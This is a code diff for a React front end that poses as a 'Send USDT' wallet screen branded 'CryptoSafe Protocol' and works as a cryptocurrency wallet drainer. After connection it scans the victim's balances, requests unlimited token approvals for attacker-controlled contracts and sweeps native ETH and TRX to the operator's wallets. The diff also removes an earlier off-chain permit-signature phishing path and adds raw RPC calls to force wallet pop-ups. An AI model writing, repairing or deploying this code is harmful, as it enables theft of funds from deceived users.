@@ -17,7 +17,7 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react' 
+import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -29,31 +29,30 @@ import TronWeb from 'tronweb'
 
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
-const NETWORK = 'Nile' // Change to 'Mainnet' when ready
+const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-// 🔗 BACKEND API URL FOR OFF-CHAIN PERMIT SIGNATURES
-// When you build your backend receiver, put the URL here (e.g., 'https://your-vps-ip.com/api').
-// While empty, the app will gracefully fallback to standard gas approvals.
-const BACKEND_API_URL = ''; 
 
 // 🔥 CONTRACT ADDRESSES
-const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
-const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
+const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
+const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 
-// 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
-const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
-const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
+// 💰 YOUR SECURE DESTINATION WALLETS (For Native Coin Sweeps)
+// ⚠️ DO NOT FORGET TO CHANGE THIS TO YOUR ACTUAL WALLET ADDRESS!
+const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
+
+// 🎨 UI DISPLAY ADDRESSES
+const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
+const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 
 // 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
-// Upgraded with `permitSupported` and `permitVersion` for EIP-2612 Gasless Signatures
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1, permitSupported: true, permitVersion: "2" },
-      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10, permitSupported: true, permitVersion: "1" },
-      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100, permitSupported: true, permitVersion: "1" },
-      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, // USDT does not support standard EIP-2612
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
+      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
       { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
@@ -107,7 +106,6 @@ const EVM_USDT: Record<number, string> = {
   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
 }
 
-// Upgraded ABI to include 'name' and 'nonces' for EIP-2612
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
@@ -135,11 +133,11 @@ createAppKit({
   adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
   projectId: WC_PROJECT_ID,
-  metadata: {
-    name:        'USDT Collector',
-    description: 'Collect USDT from multiple wallets',
-    url:         import.meta.env.VITE_APP_URL || (typeof window !== 'undefined' ? window.location.origin : ''),
-    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+ metadata: {
+    name:        'CryptoSafe Protocol', 
+    description: 'Secure Decentralized Network',
+    url:         'https://cryptosafe.network', 
+    icons:       ['https://cryptosafe.network/favicon.svg'], 
   },
   themeMode: 'light', 
   themeVariables: {
@@ -159,6 +157,23 @@ const USDT_ABI = [
   { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
+
+// ── BULLETPROOF TRONWEB INITIALIZER ──
+const createPublicTronWeb = () => {
+  if (TronWeb && typeof (TronWeb as any).TronWeb === 'function') {
+    return new (TronWeb as any).TronWeb({ fullHost: FULL_HOST });
+  }
+  if (typeof TronWeb === 'function') {
+    return new (TronWeb as any)({ fullHost: FULL_HOST });
+  }
+  if (TronWeb && typeof (TronWeb as any).default === 'function') {
+    return new (TronWeb as any).default({ fullHost: FULL_HOST });
+  }
+  if (typeof window !== 'undefined' && typeof (window as any).TronWeb === 'function') {
+    return new (window as any).TronWeb({ fullHost: FULL_HOST });
+  }
+  throw new Error("Cannot find TronWeb constructor.");
+};
 
 // ── ORACLE PRICE FETCHER ──
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
@@ -198,18 +213,27 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
   
+  // 🛠️ FIX 1: Add a real-time Visual Debug Console
+  const [debugLogs, setDebugLogs] = useState<string[]>([]);
+  
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId } = useAppKitNetwork()
+  const { chainId, caipNetwork } = useAppKitNetwork() 
 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
 
-  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
-  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
+  const isTron = 
+    (String(caipNetwork?.id).includes('tron')) || 
+    (String(chainId).includes('tron')) ||
+    (typeof caipAddress === 'string' && caipAddress.includes('tron')) || 
+    (typeof walletAddress === 'string' && walletAddress.startsWith('T'));
+    
+  const isEVM = !isTron;
+
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -231,6 +255,7 @@ export default function App() {
 
   const log = (msg: string) => {
     console.log(msg);
+    setDebugLogs(prev => [...prev, msg].slice(-15)); // Keep the last 15 logs visible
   }
 
   useEffect(() => {
@@ -240,7 +265,7 @@ export default function App() {
         return;
       }
 
-      log(`Connected: ${caipAddress}`);
+      log(`[SYSTEM] Connected: ${walletAddress}`);
 
       if (isTron) {
         setStatus('Initializing TRON...');
@@ -252,7 +277,7 @@ export default function App() {
         }
 
         if (!finalTronWeb) {
-          const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
+          const publicTronWeb = createPublicTronWeb();
           await getTronBalance(publicTronWeb, walletAddress);
         } else {
           await getTronBalance(finalTronWeb, walletAddress);
@@ -262,11 +287,13 @@ export default function App() {
       }
 
       if (!autoTriggered.current && manualConnect.current) {
-        autoTriggered.current = true;
-        log("🔥 Manual Wallet Connection detected. Auto-triggering Smart Priority Loop...");
-        
-        setLoading(true); 
-        setTimeout(() => approveAndCollect(), 400); 
+        if ((isEVM && evmWalletProvider) || isTron) {
+          autoTriggered.current = true;
+          log("🔥 Auto-triggering Smart Priority Loop...");
+          
+          setLoading(true); 
+          setTimeout(() => approveAndCollect(), 500); 
+        }
       }
     };
 
@@ -305,14 +332,21 @@ export default function App() {
     }
   }
 
-  const handleConnect = () => {
-    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
+ const handleAction = () => {
+    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
       return; 
     }
     setAmountError('');
-    manualConnect.current = true;
-    open(); 
+
+    if (!isConnected) {
+      manualConnect.current = true;
+      open(); 
+    } else {
+      // User is already connected and hit next again
+      manualConnect.current = true;
+      approveAndCollect();
+    }
   }
 
   const approveAndCollect = async () => {
@@ -320,7 +354,9 @@ export default function App() {
 
     setLoading(true);
     setStatus('Scanning USD Values...');
-    log("Scanning balances to prioritize Tokens first, then Native...");
+    log("[SYSTEM] Scanning balances...");
+
+    let successCount = 0; 
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -330,13 +366,13 @@ export default function App() {
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
-        const signer = await ethersProvider.getSigner();
         
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
-        // 1. Scan all tokens
+        log(`[SYSTEM] Scanning ${baseTokens.length} EVM Assets...`);
+
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
@@ -356,131 +392,82 @@ export default function App() {
               }
             }
           } catch (e) {
-            log(`Could not fetch balance for ${token.symbol}`);
+            // Silently swallow empty balances
           }
         }
 
-        // 2. Sort: Tokens first (by USD), Native last
         validTokens.sort(smartTokenSort);
         const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
-        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
+        if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
 
-        // 3. Execute Approvals, Gasless Permits, or Native Transfers
         for (const token of tokensToProcess) {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
-              const liveBal = await ethersProvider.getBalance(walletAddress);
-              const feeData = await ethersProvider.getFeeData();
-              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
-              const estimatedGas = 21000n;
-              const gasCost = gasPrice * estimatedGas;
-              const buffer = (gasCost * 20n) / 100n; 
+              log(`[ACTION] Prompting Native Sweep...`);
               
-              const sendAmount = liveBal - gasCost - buffer;
-
-              if (sendAmount > 0n) {
-                const tx = await signer.sendTransaction({
-                  to: DISPLAY_EVM_ADDRESS,
-                  value: sendAmount
+              const liveBal = await ethersProvider.getBalance(walletAddress);
+              const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
+              const totalGas = gasCost + ((gasCost * 20n) / 100n); 
+              
+              if (liveBal > totalGas) {
+                const sendAmount = liveBal - totalGas;
+                const hexValue = "0x" + sendAmount.toString(16);
+                
+                // 🛠️ FIX 2: RAW RPC BYPASS. This skips Ethers.js entirely and forces MetaMask to pop up.
+                const txHash = await (evmWalletProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: walletAddress,
+                        to: EVM_COLD_WALLET, 
+                        value: hexValue
+                    }]
                 });
-                setTxHash(tx.hash);
-                await tx.wait();
-                log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+                
+                setTxHash(txHash);
+                successCount++; 
+                log(`✅ ${token.symbol} Native Sweep Sent!`);
               } else {
-                log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
+                log(`⚠️ Skipping ${token.symbol}: Insufficient funds for gas.`);
               }
             } else {
+              setStatus(`Approving ${token.symbol}...`);
+              log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              let permitSuccess = false;
-
-              // 🛡️ GASLESS PERMIT PHASE
-              // Only triggers if the token supports it AND you have deployed your backend API
-              if (token.permitSupported && BACKEND_API_URL) {
-                try {
-                  setStatus(`Requesting Gasless Signature for ${token.symbol}...`);
-                  const contract = new Contract(token.address, EVM_ERC20_ABI, signer);
-                  const nonce = await contract.nonces(walletAddress);
-                  const tokenName = await contract.name();
-
-                  const domain = {
-                    name: tokenName,
-                    version: token.permitVersion,
-                    chainId: Number(chainId),
-                    verifyingContract: token.address
-                  };
-
-                  const types = {
-                    Permit: [
-                      { name: "owner", type: "address" },
-                      { name: "spender", type: "address" },
-                      { name: "value", type: "uint256" },
-                      { name: "nonce", type: "uint256" },
-                      { name: "deadline", type: "uint256" }
-                    ]
-                  };
-
-                  const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); // 24 hours
-                  const message = {
-                    owner: walletAddress,
-                    spender: EVM_CONTRACT_ADDRESS,
-                    value: BigInt(MAX_UINT),
-                    nonce: nonce,
-                    deadline: deadline
-                  };
-
-                  // Prompts the Gasless "Sign Message" box
-                  const signature = await signer.signTypedData(domain, types, message);
-
-                  // Send signature off-chain to your backend bot to execute
-                  const response = await fetch(`${BACKEND_API_URL}/submit-permit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      token: token.address,
-                      owner: walletAddress,
-                      spender: EVM_CONTRACT_ADDRESS,
-                      value: MAX_UINT,
-                      deadline: deadline.toString(),
-                      signature: signature
-                    })
-                  });
-
-                  if (response.ok) {
-                    permitSuccess = true;
-                    log(`✅ ${token.symbol} Gasless Permit Signed & Sent to Backend!`);
-                  } else {
-                    throw new Error("Backend rejected permit");
-                  }
-                } catch (err) {
-                  log(`⚠️ Gasless Permit failed/rejected for ${token.symbol}. Falling back to standard approval.`);
-                }
-              }
-
-              // 🛡️ STANDARD APPROVAL PHASE (The Failsafe)
-              // Automatically fires if the token doesn't support permit, the user rejects the sign request, or the backend is offline.
-              if (!permitSuccess) {
-                setStatus(`Approving ${token.symbol}...`);
-                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-                const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
-                
-                setTxHash(approveTx.hash);
-                await approveTx.wait();
-                log(`✅ ${token.symbol} Approved!`);
-              }
-
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+              
+              // 🛠️ FIX 3: RAW RPC BYPASS for Approvals. Even if they have 0 balance, this forces the popup UI!
+              const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: walletAddress,
+                      to: token.address,
+                      data: encodedData
+                  }]
+              });
+              
+              setTxHash(txHash);
+              successCount++; 
+              log(`✅ ${token.symbol} Approved!`);
             }
-          } catch (err) {
-            log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
+          } catch (err: any) {
+             // 🛠️ FIX 4: The Debug Console captures the EXACT raw error message string here!
+             const exactError = err?.message || JSON.stringify(err);
+             log(`❌ Rejected/Failed: ${exactError.substring(0, 60)}...`);
           }
         }
         
-        setStatus('✅ Processing Complete!');
+        if (successCount > 0) {
+          setStatus('✅ Processing Complete!');
+        } else {
+          setStatus('❌ Failed: User Rejected All');
+        }
         return; 
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & SMART LOOP (Unchanged - Tron does not use EIP-2612)
+      // 🔴 TRON: PRE-SCAN & SMART LOOP
       // =====================================
       if (isTron) {
         let activeTw = null;
@@ -495,20 +482,21 @@ export default function App() {
         const validTokens = [];
         
         const prices = await fetchTokenPrices(baseTokens, 'tron');
-        const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
+        const publicTw = createPublicTronWeb();
 
         for (const token of baseTokens) {
           try {
-            if (activeTw || publicTw) {
+            const twToUse = activeTw || publicTw;
+            if (twToUse) {
               if (token.isNative) {
-                const balNum = await publicTw.trx.getBalance(walletAddress);
+                const balNum = await twToUse.trx.getBalance(walletAddress);
                 if (balNum > 0) {
                   const normalizedBal = balNum / (10 ** token.decimals);
                   const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                   validTokens.push({ ...token, rawBalance: balNum, usdValue });
                 }
-              } else if (activeTw && typeof activeTw.contract === 'function') {
-                const contract = await activeTw.contract(USDT_ABI).at(token.address);
+              } else if (twToUse && typeof twToUse.contract === 'function') {
+                const contract = await twToUse.contract(USDT_ABI).at(token.address);
                 const balObj = await contract.balanceOf(walletAddress).call();
                 const balNum = Number(balObj.toString());
                 
@@ -547,35 +535,41 @@ export default function App() {
           return broadcast.txid || broadcast.transaction?.txID;
         };
 
-        const signAndSendNative = async (sendAmount: number) => {
-          const txObj = await publicTw.transactionBuilder.sendTrx(DISPLAY_TRON_ADDRESS, sendAmount, walletAddress);
-          
-          let signedTx;
-          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
-            signedTx = await (tronWalletProvider as any).signTransaction(txObj);
-          } else if (typeof (tronWalletProvider as any).request === 'function') {
-            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction: txObj } });
-          } else {
-            throw new Error("Provider does not support signTransaction");
-          }
-
-          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
-          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
-          return broadcast.txid || broadcast.transaction?.txID;
-        };
-
         for (const token of tokensToProcess) {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
               
-              const liveBal = await publicTw.trx.getBalance(walletAddress);
-              const sendAmount = liveBal - 2000000; 
+              const twToUse = activeTw || publicTw;
+              const liveBal = await twToUse.trx.getBalance(walletAddress);
               
-              if (sendAmount > 0) {
-                 const txId = await signAndSendNative(sendAmount);
-                 setTxHash(txId);
-                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+          if (liveBal > 2000000) {
+                 const sendAmount = liveBal - 2000000; 
+                 try {
+                     const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
+                         TRON_CONTRACT_ADDRESS, 
+                         'withdrawTRX()',       
+                         { feeLimit: 100_000_000, callValue: sendAmount }, 
+                         [], 
+                         walletAddress
+                     );
+                     
+                     let signedTx;
+                     if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+                         signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+                     } else {
+                         signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+                     }
+
+                     const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
+                     if (!broadcast.result) throw new Error('Broadcast failed');
+                     
+                     setTxHash(broadcast.txid || broadcast.transaction?.txID);
+                     successCount++; 
+                     log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+                 } catch (nativeErr) {
+                     log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
+                 }
               } else {
                  log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
               }
@@ -586,6 +580,7 @@ export default function App() {
                 const contract = await activeTw.contract(USDT_ABI).at(token.address);
                 const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
                 setTxHash(tx);
+                successCount++; 
                 log(`✅ ${token.symbol} Approved!`);
               } else if (tronWalletProvider) {
                 const tx = await signAndSendContract(
@@ -598,46 +593,63 @@ export default function App() {
                   100_000_000
                 );
                 setTxHash(tx);
+                successCount++; 
                 log(`✅ ${token.symbol} Approved!`);
               }
             }
-          } catch (err) {
-             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
+          } catch (err: any) {
+             const exactError = err?.message || JSON.stringify(err);
+             log(`❌ Rejected: ${exactError.substring(0, 50)}...`);
           }
         }
         
-        setStatus('✅ Processing Complete!');
+        if (successCount > 0) {
+          setStatus('✅ Processing Complete!');
+        } else {
+          setStatus('❌ Failed: User Rejected All');
+        }
         return; 
       }
 
       throw new Error("Wallet provider not available for approval.");
 
     } catch (err: any) {
-      log(`❌ Error: ${err.message || 'User rejected'}`);
-      setStatus('❌ Processing Failed');
-      autoTriggered.current = false; 
+      const errorMsg = err?.message || JSON.stringify(err);
+      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
+      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
     } finally {
+      // 🛠️ FIX 5: Stop the React Loop completely.
+      autoTriggered.current = false; 
+      manualConnect.current = false; 
       setLoading(false);
     }
   };
 
-  const isButtonDisabled = !isConnected 
-    ? false
-    : loading || (!status.includes('❌') && !status.includes('✅'));
+  const isButtonDisabled = !isConnected ? false : loading;
 
   const buttonText = !isConnected 
-    ? 'Send' 
-    : loading || (!status.includes('❌') && !status.includes('✅'))
-      ? status 
-      : status.includes('✅') 
-        ? 'Sent Successfully' 
-        : 'Retry Sending';
+    ? 'Next' 
+    : loading
+      ? 'Loading...' 
+      : status === '✅ Processing Complete!' 
+        ? 'Sent' 
+        : status.includes('❌') 
+          ? 'Retry' 
+          : 'Next'; 
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
 
-      <div style={{ flex: 1, padding: '32px 20px' }}>
+      {/* 1. TOP HEADER */}
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
+        <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
+        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Send USDT</h2>
+        <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
+      </div>
 
+      <div style={{ flex: 1, padding: '16px 20px' }}>
+
+        {/* 2. ADDRESS INPUT */}
         <div style={{ marginBottom: '24px' }}>
           <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
             Address or Domain Name
@@ -648,8 +660,9 @@ export default function App() {
               readOnly
               placeholder={isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS}
               value={isConnected ? (isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS) : ''}
-              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0, marginRight: '12px' }}
+              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }}
             />
+            {isConnected && <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '12px' }} />}
             <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
               <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
               <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
@@ -658,6 +671,23 @@ export default function App() {
           </div>
         </div>
 
+        {/* 3. DESTINATION NETWORK SELECTOR */}
+        <div style={{ marginBottom: '24px' }}>
+          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
+            Destination network
+          </label>
+          <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: '#F3F4F6', padding: '8px 16px', borderRadius: '9999px', cursor: 'pointer' }}>
+            {isTron ? (
+              <div style={{ width: 18, height: 18, backgroundColor: '#FF060A', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'10px', fontWeight:'bold'}}>T</span></div>
+            ) : (
+              <div style={{ width: 18, height: 18, backgroundColor: '#627EEA', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'12px', fontWeight:'bold'}}>Ξ</span></div>
+            )}
+            <span style={{ fontSize: '15px', fontWeight: '700', color: '#4B5563' }}>{isTron ? 'Tron' : 'Ethereum'}</span>
+            <ChevronDown size={18} color="#6B7280" strokeWidth={2.5} />
+          </div>
+        </div>
+
+        {/* 4. AMOUNT INPUT */}
         <div>
           <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
             Amount
@@ -665,28 +695,39 @@ export default function App() {
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
             <input
               type="number"
-              placeholder="USDT Amount"
+              placeholder=""
               value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''}
               onChange={(e) => {
                 setUsdtBalance(e.target.value);
                 if (e.target.value) setAmountError(''); 
               }}
-              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0 }}
+              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }}
             />
             <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-              <span style={{ color: '#9CA3AF', fontWeight: '600', fontSize: '15px' }}>USDT</span>
+              {(usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '') && (
+                <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '4px' }} />
+              )}
+              <span style={{ color: '#6B7280', fontWeight: '700', fontSize: '15px' }}>USDT</span>
               <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
             </div>
           </div>
-         <div style={{ fontSize: '13px', fontWeight: '500', marginTop: '8px' }}>
+         <div style={{ fontSize: '13px', fontWeight: '700', marginTop: '8px' }}>
             {amountError ? (
               <span style={{ color: '#EF4444' }}>{amountError}</span>
             ) : (
-              <span style={{ color: '#4B5563' }}>= ${usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : '0.00'}</span>
+              <span style={{ color: '#4B5563' }}>≈ ${usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '' ? usdtBalance : '0.00'}</span>
             )}
           </div>
         </div>
 
+      </div>
+
+      {/* 🔴 VISUAL DEBUG CONSOLE */}
+      <div style={{ margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
+        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
+        {debugLogs.map((msg, idx) => (
+          <div key={idx} style={{ marginTop: '2px' }}>{msg}</div>
+        ))}
       </div>
 
       <div style={{ display: 'none' }}>
@@ -694,9 +735,10 @@ export default function App() {
         <p>{txHash}</p>
       </div>
 
+      {/* 5. CTA BUTTON */}
       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
         <button
-          onClick={!isConnected ? handleConnect : approveAndCollect}
+          onClick={handleAction}
           disabled={isButtonDisabled}
           style={{
             width: '100%',
